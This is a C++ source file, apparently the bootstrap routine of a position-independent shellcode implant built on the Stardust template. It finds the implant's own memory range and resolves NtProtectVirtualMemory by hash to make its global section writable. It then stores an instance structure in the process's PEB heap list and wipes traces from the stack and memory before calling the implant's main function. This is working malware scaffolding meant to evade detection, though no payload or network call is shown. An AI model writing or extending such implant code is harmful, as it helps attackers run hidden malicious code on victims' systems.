#include <common/Imperium.h>

ST_GLOBAL PVOID __Instance = C_PTR( 'rdp5' );

EXTERN_C FUNC VOID PreMain(
    PVOID Param
) {
    INSTANCE Stardust = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };
    PPEB     Peb      = NtCurrentPeb();

    Imperium::mem::zero( &Stardust, sizeof( Stardust ) );

    //
    // set a context to find the instance struct in memory
    //
    Stardust.Context = 0xc0debabe;

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Stardust.Base.Buffer = StRipStart();
    Stardust.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Stardust.Base.Buffer );

    //
    // get the offset and address of our global instance structure
    //
    MmAddr = Stardust.Base.Buffer + InstanceOffset();
    MmSize = sizeof( PVOID );

    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    if ( ! NT_SUCCESS( Imperium::win32::call< fnNtProtectVirtualMemory >(
        H_FUNC( "ntdll!NtProtectVirtualMemory" ),
        NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect
    ) ) ) {
        return;
    }

    //
    // assign heap address into the RW memory page
    //
    if ( ! ( C_DEF( MmAddr ) = Imperium::mem::alloc( sizeof( INSTANCE ) ) ) ) {
        return;
    }

    //
    // add the address of the struct to the peb
    //
    if ( Peb->NumberOfHeaps < Peb->MaximumNumberOfHeaps ) {
        Peb->ProcessHeaps[ Peb->NumberOfHeaps++ ] = C_DEF( MmAddr );
    }

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    Imperium::mem::copy( C_DEF( MmAddr ), &Stardust, sizeof( INSTANCE ) );
    Imperium::mem::zero( &Stardust, sizeof( INSTANCE ) );
    Imperium::mem::zero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // now execute the implant entrypoint
    //
    Main( Param );
}
